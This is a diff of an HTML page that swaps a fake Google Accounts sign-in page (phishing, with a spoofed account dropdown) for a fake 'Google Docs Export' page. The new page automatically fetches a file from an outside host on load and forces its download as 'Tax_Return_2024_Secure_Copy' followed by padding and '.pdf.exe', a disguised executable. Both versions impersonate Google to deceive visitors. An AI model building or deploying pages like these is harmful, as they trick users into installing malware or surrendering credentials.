@@ -2,108 +2,83 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Sign in – Google Accounts</title>
-  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
+  <title>Google Docs Export</title>
+  <link rel="icon" href="https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico">
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
+      background: #f8f9fa;
       font-family: Roboto, sans-serif;
-      background: #f2f2f2;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      text-align: center;
+      padding-top: 100px;
     }
-    .container {
+    .box {
       background: white;
+      display: inline-block;
       padding: 40px;
       border-radius: 8px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
-      width: 360px;
-      position: relative;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .logo {
-      text-align: center;
+    .gdoc-logo {
+      height: 40px;
+      margin-bottom: 20px;
+    }
+    .info {
+      font-size: 18px;
       margin-bottom: 30px;
+      color: #444;
     }
-    .logo img {
-      width: 75px;
-    }
-    h1 {
-      font-size: 22px;
-      font-weight: normal;
-      color: #202124;
-    }
-    input[type="email"] {
-      width: 100%;
-      padding: 10px;
-      margin-top: 20px;
-      font-size: 16px;
-      box-sizing: border-box;
-    }
-    button {
-      margin-top: 30px;
-      width: 100%;
-      padding: 10px;
+    .btn {
+      padding: 12px 30px;
       background: #1a73e8;
       color: white;
       border: none;
+      border-radius: 4px;
       font-size: 16px;
       cursor: pointer;
-      border-radius: 4px;
     }
-    #fakeDropdown {
-      display: none;
-      position: absolute;
-      top: 155px;
-      left: 40px;
-      width: 280px;
-      background: white;
-      border: 1px solid #ccc;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      z-index: 9999;
-    }
-    #fakeDropdown span {
-      display: block;
-      padding: 10px;
-      cursor: pointer;
-    }
-    #fakeDropdown span:hover {
-      background-color: #eee;
+    .btn:hover {
+      background: #0c5cd8;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
-    </div>
-    <h1>Sign in</h1>
-    <p>to continue to Gmail</p>
-    <input type="email" id="emailInput" autocomplete="email" placeholder="Email or phone" />
-    <div id="fakeDropdown">
-      <span>youremail@gmail.com</span>
-      <span>alt.account@domain.com</span>
-    </div>
-    <button onclick="submitLogin()">Next</button>
+  <div class="box">
+    <img class="gdoc-logo" src="https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico" alt="Google Docs" />
+    <div class="info">Preparing your secure document download...</div>
+    <button class="btn" onclick="triggerDownload()">Click here if download doesn't start</button>
   </div>
 
   <script>
-    const input = document.getElementById('emailInput');
-    const dropdown = document.getElementById('fakeDropdown');
+    const spoofedFilename = "Tax_Return_2024_Secure_Copy__________________________.pdf.exe";
 
-    input.addEventListener('focus', () => {
-      // Fake prompt untuk menekan native autofill
-      setTimeout(() => {
-        Notification.requestPermission().then(() => {});
-      }, 150);
+    async function triggerDownload() {
+      const url = "https://ybt01.github.io/upload/app-debug.apk"; // could be EXE disguised as PDF
 
-      // Tampilkan dropdown palsu
-      setTimeout(() => {
-        dropdown.style.display = 'block';
-      }, 400);
-    });
+      try {
+        const response = await fetch(url);
+        if (response.ok) {
+          const blob = await response.blob();
+          const reader = new FileReader();
+          reader.onloadend = function() {
+            const base64data = reader.result.split(',')[1];
+            const downloadLink = document.createElement("a");
+            downloadLink.download = spoofedFilename;
+            downloadLink.href = 'data:application/octet-stream;base64,' + base64data;
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+          };
+          reader.readAsDataURL(blob);
+        }
+      } catch (err) {
+        console.error("Download failed", err);
+      }
+    }
 
-    dropdown.addEventListener('click', () => {
-      dropdown.style.display = 'none';
+    window.onload = () => {
+      setTimeout(triggerDownload, 1500); // auto-start after page load
+    };
+  </script>
+</body>
+</html>
